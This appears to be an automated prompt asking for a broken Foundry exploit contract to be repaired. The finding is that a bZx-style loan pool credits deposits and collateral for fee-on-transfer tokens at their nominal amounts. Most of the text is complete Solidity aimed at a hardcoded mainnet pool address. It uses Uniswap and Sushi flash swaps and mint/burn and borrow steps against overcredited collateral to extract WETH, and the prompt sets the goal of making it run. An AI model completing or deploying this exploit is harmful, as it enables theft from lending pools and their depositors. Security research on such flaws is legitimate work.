You are fixing a failing Foundry PoC for finding F-002.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: alternate_public_liquidity_route
- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Nominal-amount accounting overcredits deposits and collateral for fee-on-transfer assets
- claim: `_mintToken`, `_totalDeposit`, and both `_verifyTransfers` variants use user-declared amounts (`depositAmount`, `loanTokenSent`, `collateralTokenSent`) for minting and downstream loan accounting, but they never measure the actual token balance delta received after `transferFrom`.
- impact: If any supported asset is deflationary, fee-on-transfer, or otherwise delivers less than the nominal amount, lenders can receive too many pool shares for too little underlying and borrowers can open or top up positions with less real collateral/funding than the accounting assumes, creating dilution, bad debt, or pool insolvency.
- exploit_paths: ["Deposit a fee-on-transfer `loanTokenAddress` via `mint`; shares are minted from `depositAmount` even if the pool receives less.", "Open `borrow` or `marginTrade` using a fee-on-transfer collateral token or loan token contribution; `sentAmounts` still report the pre-fee amount to `bZxContract`."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface ILoanTokenPool {
    struct LoanOpenData {
        bytes32 loanId;
        uint256 principal;
        uint256 collateral;
    }

    function loanTokenAddress() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function loanParamsIds(uint256 index) external view returns (bytes32);

    function mint(address receiver, uint256 depositAmount) external returns (uint256);
    function burn(address receiver, uint256 burnAmount) external returns (uint256);

    function getBorrowAmountForDeposit(
        uint256 depositAmount,
        uint256 initialLoanDuration,
        address collateralTokenAddress
    ) external view returns (uint256 borrowAmount);

    function borrow(
        bytes32 loanId,
        uint256 withdrawAmount,
        uint256 initialLoanDuration,
        uint256 collateralTokenSent,
        address collateralTokenAddress,
        address borrower,
        address receiver,
        bytes calldata loanDataBytes
    ) external payable returns (LoanOpenData memory);

    function marginTrade(
        bytes32 loanId,
        uint256 leverageAmount,
        uint256 loanTokenSent,
        uint256 collateralTokenSent,
        address collateralTokenAddress,
        address trader,
        bytes calldata loanDataBytes
    ) external payable returns (LoanOpenData memory);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract BalanceProbe {
    address public immutable owner;

    constructor() {
        owner = msg.sender;
    }

    function pull(address token, address from, uint256 amount) external returns (bool) {
        require(msg.sender == owner, "ONLY_OWNER");
        return _callOptionalReturn(token, abi.encodeWithSignature("transferFrom(address,address,uint256)", from, address(this), amount));
    }

    function sweep(address token, address to) external {
        require(msg.sender == owner, "ONLY_OWNER");
        uint256 amount = IERC20Minimal(token).balanceOf(address(this));
        if (amount == 0) {
            return;
        }
        _callOptionalReturn(token, abi.encodeWithSignature("transfer(address,uint256)", to, amount));
    }

    function _callOptionalReturn(address target, bytes memory data) internal returns (bool ok) {
        (bool success, bytes memory returndata) = target.call(data);
        if (!success) {
            return false;
        }
        return returndata.length == 0 || abi.decode(returndata, (bool));
    }
}

contract FlawVerifier {
    address public constant TARGET = 0xB983E01458529665007fF7E0CDdeCDB74B967Eb6;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    address public constant UNI_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address public constant SUSHI_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    address public constant USDC = 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48;
    address public constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address public constant DAI = 0x6b175474e89094c44da98b954eedeac495271d0f;

    address public constant WBTC = 0x2260fac5e5542a773aa44fbcfedf7c193bc2c599;
    address public constant LINK = 0x514910771af9ca656af840dff83e8264ecf986ca;
    address public constant MKR = 0x9f8f72aa9304c8b593d555f12ef6589cc3a579a2;
    address public constant BAT = 0x0d8775f648430679a709e98d2b0cb6250d2887ef;
    address public constant ZRX = 0xe41d2489571d322189246dafa5ebde1f4699f498;
    address public constant REP = 0x1985365e9f78359a9b6ad760e32412f4a445e862;
    address public constant YFI = 0x0bc529c00c6401aef6d220be8c6ea1667f6ad93e;
    address public constant BZRX = 0x56d811088235f11c8920698a204a5010a788f4b3;

    address public constant STA = 0xa7de087329bfcda5639247f96140f9dabe3deed1;
    address public constant PAXG = 0x45804880de22913dafe09f4980848ece6ecbaf78;
    address public constant XAUT = 0x68749665ff8d2d112fa859aa293f07a622782f38;

    uint256 internal constant MIN_PROFIT = 0.1 ether;
    uint256 internal constant BORROW_DURATION = 28 days;

    ILoanTokenPool internal constant POOL = ILoanTokenPool(TARGET);

    struct FlashContext {
        address pair;
        address token;
        address repaymentToken;
        uint256 repaymentAmount;
        uint8 mode;
    }

    struct Route {
        address pair;
        address quoteToken;
        uint256 reserveToken;
        uint256 reserveQuote;
        bool tokenIs0;
    }

    BalanceProbe internal immutable probe;

    bool public executed;
    bool public profitAchieved;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;

    string public exploitPathUsed;
    string public status;

    address internal _profitToken;
    uint256 internal _profitAmount;
    FlashContext internal _flashContext;

    constructor() {
        probe = new BalanceProbe();
        _profitToken = WETH;
        status = "not-run";
    }

    function executeOnOpportunity() external {
        require(!executed, "ALREADY_EXECUTED");
        executed = true;
        _profitToken = WETH;

        address loanToken = POOL.loanTokenAddress();
        bool touchedAnyPath;

        // Path 1 remains represented, but the forked target pool's underlying is WETH.
        // The finding's mint path requires the pool underlying itself to deliver less than
        // the nominal deposit. WETH does not do that, so this branch is infeasible here.
        if (_isPlausibleFeeToken(loanToken) && _attemptFlashMintPath(loanToken)) {
            touchedAnyPath = true;
            _finalize();
            return;
        }

        address[13] memory collateralCandidates;
        collateralCandidates[0] = PAXG;
        collateralCandidates[1] = XAUT;
        collateralCandidates[2] = STA;
        collateralCandidates[3] = USDT;
        collateralCandidates[4] = BZRX;
        collateralCandidates[5] = WBTC;
        collateralCandidates[6] = LINK;
        collateralCandidates[7] = MKR;
        collateralCandidates[8] = BAT;
        collateralCandidates[9] = ZRX;
        collateralCandidates[10] = REP;
        collateralCandidates[11] = YFI;
        collateralCandidates[12] = DAI;

        for (uint256 index = 0; index < collateralCandidates.length; index++) {
            address collateralToken = collateralCandidates[index];
            if (collateralToken == address(0) || collateralToken == loanToken) {
                continue;
            }

            bool hasBorrowPath = _loanParamsId(collateralToken, true) != bytes32(0);
            bool hasTradePath = _loanParamsId(collateralToken, false) != bytes32(0);
            if (!hasBorrowPath && !hasTradePath) {
                continue;
            }

            touchedAnyPath = true;

            if (hasBorrowPath && _attemptFlashBorrowPath(collateralToken)) {
                _finalize();
                return;
            }

            if (!profitAchieved && hasTradePath && _attemptDirectMarginTradeProbe(collateralToken)) {
                hypothesisValidated = true;
                if (bytes(exploitPathUsed).length == 0) {
                    exploitPathUsed = "marginTrade(collateralTokenSent) nominal accounting";
                }
            }
        }

        if (profitAchieved) {
            _finalize();
            return;
        }

        if (hypothesisValidated) {
            status = "validated-without-positive-net-profit";
            return;
        }

        hypothesisRefuted = true;
        status = touchedAnyPath ? "fee-token-paths-probed-but-not-self-funding" : "no-supported-fee-token-path-discovered";
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        _handleFlashCallback(sender, amount0, amount1);
    }

    function sushiCall(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        _handleFlashCallback(sender, amount0, amount1);
    }

    function _handleFlashCallback(address sender, uint256 amount0, uint256 amount1) internal {
        FlashContext memory context = _flashContext;
        require(context.pair != address(0), "NO_CONTEXT");
        require(msg.sender == context.pair, "BAD_PAIR");
        require(sender == address(this), "BAD_SENDER");

        uint256 nominalAmount = amount0 != 0 ? amount0 : amount1;
        uint256 receivedAmount = _balanceOf(context.token, address(this));
        require(receivedAmount != 0 && receivedAmount <= nominalAmount, "BAD_FLASH_AMOUNT");

        if (context.mode == 1) {
            _executeMintPathInCallback(context.token, nominalAmount, receivedAmount);
        } else {
            _executeBorrowPathInCallback(context.token, nominalAmount, receivedAmount);
        }

        _flashContext = FlashContext(address(0), address(0), address(0), 0, 0);
    }

    function _executeMintPathInCallback(address loanToken, uint256 nominalAmount, uint256 receivedAmount) internal {
        bool taxed = nominalAmount > receivedAmount || _detectTransferFromFee(loanToken, receivedAmount);
        require(taxed, "LOAN_TOKEN_NOT_FEE_ON_TRANSFER");

        uint256 spendableAmount = _balanceOf(loanToken, address(this));
        uint256 beforeLoanToken = spendableAmount;

        _forceApprove(loanToken, TARGET, spendableAmount);

        uint256 sharesBefore = POOL.balanceOf(address(this));
        uint256 mintedShares;
        try POOL.mint(address(this), spendableAmount) returns (uint256 minted) {
            mintedShares = minted;
        } catch {
            revert("MINT_PATH_FAILED");
        }

        if (mintedShares == 0) {
            uint256 sharesAfter = POOL.balanceOf(address(this));
            if (sharesAfter > sharesBefore) {
                mintedShares = sharesAfter - sharesBefore;
            }
        }
        require(mintedShares != 0, "NO_SHARES");

        hypothesisValidated = true;
        exploitPathUsed = "mint(depositAmount) overcredits fee-on-transfer loanToken deposits";

        try POOL.burn(address(this), mintedShares) returns (uint256) {
            uint256 afterLoanToken = _balanceOf(loanToken, address(this));
            require(afterLoanToken > beforeLoanToken, "NO_MINT_SPREAD");
            _profitToken = loanToken;
            _profitAmount = afterLoanToken - beforeLoanToken;
            profitAchieved = _profitAmount >= MIN_PROFIT;
        } catch {
            revert("BURN_PATH_FAILED");
        }
    }

    function _executeBorrowPathInCallback(address collateralToken, uint256 nominalAmount, uint256 receivedAmount) internal {
        bool taxed = nominalAmount > receivedAmount || _detectTransferFromFee(collateralToken, receivedAmount);
        require(taxed, "COLLATERAL_NOT_FEE_ON_TRANSFER");

        uint256 spendableAmount = _balanceOf(collateralToken, address(this));
        _forceApprove(collateralToken, TARGET, spendableAmount);

        uint256 repaymentWeth = _wethCostForRepayment(_flashContext.repaymentToken, _flashContext.repaymentAmount);
        uint256 borrowAmount = POOL.getBorrowAmountForDeposit(spendableAmount, BORROW_DURATION, collateralToken);
        require(borrowAmount > repaymentWeth + MIN_PROFIT, "NOT_PROFITABLE");

        uint256 safeBorrowAmount = borrowAmount - (borrowAmount / 500);
        uint256 wethBefore = _balanceOf(WETH, address(this));

        // Extra public-liquidity steps are limited to sourcing taxed collateral and, when the
        // best liquidity is quoted in a stablecoin, swapping part of borrowed WETH into that
        // quote asset for flash repayment. The exploit root cause remains the same: bZx credits
        // nominal collateralTokenSent even though transferFrom delivers less.
        try POOL.borrow(
            bytes32(0),
            safeBorrowAmount,
            BORROW_DURATION,
            spendableAmount,
            collateralToken,
            address(this),
            address(this),
            ""
        ) returns (ILoanTokenPool.LoanOpenData memory) {
            hypothesisValidated = true;
            exploitPathUsed = "borrow(collateralTokenSent) nominal accounting with alternate public liquidity";
        } catch {
            revert("BORROW_PATH_FAILED");
        }

        uint256 wethAfterBorrow = _balanceOf(WETH, address(this));
        require(wethAfterBorrow > wethBefore, "NO_WETH_BORROWED");

        if (_flashContext.repaymentToken == WETH) {
            _safeTransfer(WETH, _flashContext.pair, _flashContext.repaymentAmount);
        } else {
            _swapWethForExactToken(_flashContext.repaymentToken, _flashContext.repaymentAmount);
            _safeTransfer(_flashContext.repaymentToken, _flashContext.pair, _flashContext.repaymentAmount);
        }

        uint256 remainingWeth = _balanceOf(WETH, address(this));
        require(remainingWeth >= MIN_PROFIT, "PROFIT_BELOW_THRESHOLD");

        profitAchieved = true;
        _profitToken = WETH;
        _profitAmount = remainingWeth;
    }

    function _attemptFlashMintPath(address loanToken) internal returns (bool) {
        Route memory route = _findBestRoute(loanToken);
        if (route.pair == address(0) || route.quoteToken != WETH) {
            return false;
        }

        uint256[4] memory denominators = [uint256(200), 100, 50, 20];
        for (uint256 index = 0; index < denominators.length; index++) {
            uint256 amountOut = route.reserveToken / denominators[index];
            if (amountOut <= 1) {
                continue;
            }

            uint256 repaymentWeth = _getAmountIn(amountOut, route.reserveQuote, route.reserveToken);
            if (repaymentWeth == 0) {
                continue;
            }

            _flashContext = FlashContext(route.pair, loanToken, WETH, repaymentWeth, 1);

            try IUniswapV2Pair(route.pair).swap(
                route.tokenIs0 ? amountOut : 0,
                route.tokenIs0 ? 0 : amountOut,
                address(this),
                abi.encode(uint256(1))
            ) {
                if (profitAchieved) {
                    return true;
                }
            } catch {
                _flashContext = FlashContext(address(0), address(0), address(0), 0, 0);
            }
        }

        return false;
    }

    function _attemptFlashBorrowPath(address collateralToken) internal returns (bool) {
        Route memory route = _findBestRoute(collateralToken);
        if (route.pair == address(0)) {
            return false;
        }

        uint256[7] memory denominators = [uint256(2000), 1000, 500, 250, 100, 50, 20];
        for (uint256 index = 0; index < denominators.length; index++) {
            uint256 amountOut = route.reserveToken / denominators[index];
            if (amountOut <= 1) {
                continue;
            }

            uint256 repaymentAmount = _getAmountIn(amountOut, route.reserveQuote, route.reserveToken);
            if (repaymentAmount == 0) {
                continue;
            }

            uint256 quotedBorrow = POOL.getBorrowAmountForDeposit(amountOut, BORROW_DURATION, collateralToken);
            uint256 quotedRepaymentWeth = _wethCostForRepayment(route.quoteToken, repaymentAmount);
            if (quotedBorrow <= quotedRepaymentWeth + MIN_PROFIT) {
                continue;
            }

            _flashContext = FlashContext(route.pair, collateralToken, route.quoteToken, repaymentAmount, 2);

            try IUniswapV2Pair(route.pair).swap(
                route.tokenIs0 ? amountOut : 0,
                route.tokenIs0 ? 0 : amountOut,
                address(this),
                abi.encode(uint256(2))
            ) {
                if (profitAchieved) {
                    return true;
                }
            } catch {
                _flashContext = FlashContext(address(0), address(0), address(0), 0, 0);
            }
        }

        return false;
    }

    function _attemptDirectMarginTradeProbe(address collateralToken) internal returns (bool) {
        uint256 heldCollateral = _balanceOf(collateralToken, address(this));
        if (heldCollateral == 0) {
            return false;
        }

        if (!_detectTransferFromFee(collateralToken, heldCollateral)) {
            return false;
        }

        uint256 spendableCollateral = _balanceOf(collateralToken, address(this));
        if (spendableCollateral == 0) {
            return false;
        }

        _forceApprove(collateralToken, TARGET, spendableCollateral);
        try POOL.marginTrade(
            bytes32(0),
            2e18,
            0,
            spendableCollateral,
            collateralToken,
            address(this),
            ""
        ) returns (ILoanTokenPool.LoanOpenData memory) {
            return true;
        } catch {
            return false;
        }
    }

    function _findBestRoute(address token) internal view returns (Route memory best) {
        address[4] memory quoteTokens;
        quoteTokens[0] = USDC;
        quoteTokens[1] = USDT;
        quoteTokens[2] = DAI;
        quoteTokens[3] = WETH;

        address[2] memory factories;
        factories[0] = UNI_V2_FACTORY;
        factories[1] = SUSHI_FACTORY;

        for (uint256 i = 0; i < quoteTokens.length; i++) {
            address quote = quoteTokens[i];
            if (quote == token) {
                continue;
            }

            for (uint256 j = 0; j < factories.length; j++) {
                address pair = _getPair(factories[j], token, quote);
                if (pair == address(0)) {
                    continue;
                }

                (uint256 reserveToken, uint256 reserveQuote, bool tokenIs0) = _pairReserves(pair, token, quote);
                if (reserveToken == 0 || reserveQuote == 0) {
                    continue;
                }

                if (reserveToken > best.reserveToken) {
                    best = Route(pair, quote, reserveToken, reserveQuote, tokenIs0);
                }
            }
        }
    }

    function _wethCostForRepayment(address repaymentToken, uint256 repaymentAmount) internal view returns (uint256) {
        if (repaymentAmount == 0) {
            return 0;
        }
        if (repaymentToken == WETH) {
            return repaymentAmount;
        }

        address pair = _pairFor(repaymentToken, WETH);
        if (pair == address(0)) {
            return type(uint256).max;
        }

        (uint256 reserveToken, uint256 reserveWeth,) = _pairReserves(pair, repaymentToken, WETH);
        return _getAmountIn(repaymentAmount, reserveWeth, reserveToken);
    }

    function _swapWethForExactToken(address tokenOut, uint256 amountOut) internal returns (uint256 wethSpent) {
        address pair = _pairFor(tokenOut, WETH);
        require(pair != address(0), "NO_WETH_REPAY_ROUTE");

        (uint256 reserveTokenOut, uint256 reserveWeth, bool tokenOutIs0) = _pairReserves(pair, tokenOut, WETH);
        wethSpent = _getAmountIn(amountOut, reserveWeth, reserveTokenOut);
        require(wethSpent != 0, "BAD_WETH_REPAY_QUOTE");

        _safeTransfer(WETH, pair, wethSpent);
        IUniswapV2Pair(pair).swap(
            tokenOutIs0 ? amountOut : 0,
            tokenOutIs0 ? 0 : amountOut,
            address(this),
            new bytes(0)
        );
    }

    function _pairFor(address tokenA, address tokenB) internal view returns (address pair) {
        pair = _getPair(UNI_V2_FACTORY, tokenA, tokenB);
        if (pair != address(0)) {
            return pair;
        }
        return _getPair(SUSHI_FACTORY, tokenA, tokenB);
    }

    function _getPair(address factory, address tokenA, address tokenB) internal view returns (address pair) {
        (bool success, bytes memory returndata) = factory.staticcall(
            abi.encodeWithSelector(IUniswapV2Factory.getPair.selector, tokenA, tokenB)
        );
        if (!success || returndata.length < 32) {
            return address(0);
        }
        pair = abi.decode(returndata, (address));
    }

    function _pairReserves(
        address pair,
        address asset,
        address quoteAsset
    ) internal view returns (uint256 reserveAsset, uint256 reserveQuote, bool assetIsToken0) {
        address token0 = IUniswapV2Pair(pair).token0();
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2Pair(pair).getReserves();
        if (token0 == asset) {
            require(IUniswapV2Pair(pair).token1() == quoteAsset, "BAD_PAIR_ASSET");
            return (uint256(reserve0), uint256(reserve1), true);
        }
        require(token0 == quoteAsset, "BAD_PAIR_QUOTE");
        return (uint256(reserve1), uint256(reserve0), false);
    }

    function _getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountOut == 0 || reserveIn == 0 || reserveOut == 0 || amountOut >= reserveOut) {
            return 0;
        }
        uint256 numerator = reserveIn * amountOut * 1000;
        uint256 denominator = (reserveOut - amountOut) * 997;
        return (numerator / denominator) + 1;
    }

    function _loanParamsId(address collateralToken, bool isTorqueLoan) internal view returns (bytes32) {
        return POOL.loanParamsIds(uint256(keccak256(abi.encodePacked(collateralToken, isTorqueLoan))));
    }

    function _isPlausibleFeeToken(address token) internal pure returns (bool) {
        return token == STA || token == PAXG || token == XAUT || token == USDT || token == BZRX;
    }

    function _finalize() internal {
        if (_profitToken == address(0)) {
            _profitToken = WETH;
        }

        uint256 realized = _balanceOf(_profitToken, address(this));
        if (_profitToken == WETH) {
            _profitAmount = realized;
        } else if (_profitAmount == 0) {
            _profitAmount = realized;
        }

        profitAchieved = _profitAmount >= MIN_PROFIT;
        hypothesisValidated = hypothesisValidated || profitAchieved;
        status = profitAchieved ? "profit-achieved" : "profit-below-threshold";
    }

    function _detectTransferFromFee(address token, uint256 balance) internal returns (bool) {
        uint256 probeAmount = balance / 1000;
        if (probeAmount == 0) {
            probeAmount = balance / 2;
        }
        if (probeAmount == 0) {
            return false;
        }

        _forceApprove(token, address(probe), probeAmount);

        uint256 beforeProbe = _balanceOf(token, address(probe));
        bool ok = probe.pull(token, address(this), probeAmount);
        if (!ok) {
            return false;
        }

        uint256 afterProbe = _balanceOf(token, address(probe));
        probe.sweep(token, address(this));

        if (afterProbe <= beforeProbe) {
            return false;
        }

        return (afterProbe - beforeProbe) < probeAmount;
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSignature("approve(address,uint256)", spender, 0));
        _callOptionalReturn(token, abi.encodeWithSignature("approve(address,uint256)", spender, amount));
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        require(_callOptionalReturn(token, abi.encodeWithSignature("transfer(address,uint256)", to, amount)), "TRANSFER_FAILED");
    }

    function _balanceOf(address token, address account) internal view returns (uint256 amount) {
        (bool success, bytes memory returndata) = token.staticcall(abi.encodeWithSignature("balanceOf(address)", account));
        if (!success || returndata.length < 32) {
            return 0;
        }
        amount = abi.decode(returndata, (uint256));
    }

    function _callOptionalReturn(address target, bytes memory data) internal returns (bool ok) {
        (bool success, bytes memory returndata) = target.call(data);
        if (!success) {
            return false;
        }
        return returndata.length == 0 || abi.decode(returndata, (bool));
    }
}

```

forge stdout (tail):
```
 information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
   --> src/FlawVerifier.sol:108:35:
    |
108 |     address public constant BAT = 0x0d8775f648430679a709e98d2b0cb6250d2887ef;
    |                                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Error (9429): This looks like an address but has an invalid checksum. Correct checksummed address: "0xE41d2489571d322189246DaFA5ebDe1F4699F498". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
SyntaxError: This looks like an address but has an invalid checksum. Correct checksummed address: "0xE41d2489571d322189246DaFA5ebDe1F4699F498". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
   --> src/FlawVerifier.sol:109:35:
    |
109 |     address public constant ZRX = 0xe41d2489571d322189246dafa5ebde1f4699f498;
    |                                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Error (9429): This looks like an address but has an invalid checksum. Correct checksummed address: "0x1985365e9f78359a9B6AD760e32412f4a445E862". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
SyntaxError: This looks like an address but has an invalid checksum. Correct checksummed address: "0x1985365e9f78359a9B6AD760e32412f4a445E862". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
   --> src/FlawVerifier.sol:110:35:
    |
110 |     address public constant REP = 0x1985365e9f78359a9b6ad760e32412f4a445e862;
    |                                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Error (9429): This looks like an address but has an invalid checksum. Correct checksummed address: "0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
SyntaxError: This looks like an address but has an invalid checksum. Correct checksummed address: "0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
   --> src/FlawVerifier.sol:111:35:
    |
111 |     address public constant YFI = 0x0bc529c00c6401aef6d220be8c6ea1667f6ad93e;
    |                                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Error (9429): This looks like an address but has an invalid checksum. Correct checksummed address: "0x56d811088235F11C8920698a204A5010a788f4b3". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
SyntaxError: This looks like an address but has an invalid checksum. Correct checksummed address: "0x56d811088235F11C8920698a204A5010a788f4b3". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
   --> src/FlawVerifier.sol:112:36:
    |
112 |     address public constant BZRX = 0x56d811088235f11c8920698a204a5010a788f4b3;
    |                                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Error (9429): This looks like an address but has an invalid checksum. Correct checksummed address: "0xa7DE087329BFcda5639247F96140f9DAbe3DeED1". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
SyntaxError: This looks like an address but has an invalid checksum. Correct checksummed address: "0xa7DE087329BFcda5639247F96140f9DAbe3DeED1". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
   --> src/FlawVerifier.sol:114:35:
    |
114 |     address public constant STA = 0xa7de087329bfcda5639247f96140f9dabe3deed1;
    |                                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Error (9429): This looks like an address but has an invalid checksum. Correct checksummed address: "0x45804880De22913dAFE09f4980848ECE6EcbAf78". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
SyntaxError: This looks like an address but has an invalid checksum. Correct checksummed address: "0x45804880De22913dAFE09f4980848ECE6EcbAf78". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
   --> src/FlawVerifier.sol:115:36:
    |
115 |     address public constant PAXG = 0x45804880de22913dafe09f4980848ece6ecbaf78;
    |                                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Error (9429): This looks like an address but has an invalid checksum. Correct checksummed address: "0x68749665FF8D2d112Fa859AA293F07A622782F38". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
SyntaxError: This looks like an address but has an invalid checksum. Correct checksummed address: "0x68749665FF8D2d112Fa859AA293F07A622782F38". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
   --> src/FlawVerifier.sol:116:36:
    |
116 |     address public constant XAUT = 0x68749665ff8d2d112fa859aa293f07a622782f38;
    |                                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^


```

forge stderr (tail):
```
Error: Compilation failed

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
